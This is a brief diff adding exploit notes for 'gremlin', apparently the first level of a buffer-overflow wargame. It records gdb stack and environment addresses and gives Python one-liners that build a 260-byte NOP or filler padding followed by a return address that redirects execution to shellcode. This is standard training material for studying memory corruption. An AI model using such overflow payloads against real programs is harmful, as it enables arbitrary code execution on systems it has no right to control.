@@ -1,0 +1,12 @@
+$gdb ./gremlin
+
+ret : 0xbffffb4c
+buf : 0xbffffa48   // ebp-256
+env : 0xbffffa89
+
+payload = 260 + shellcode address
+
+    `python -c 'print "\x90"*260 + "\x89\xfa\xff\xbf"'`
+
+
+python -c 'print "%s%s" % ("A"*260, "\xf1\xfb\xff\xbf")'
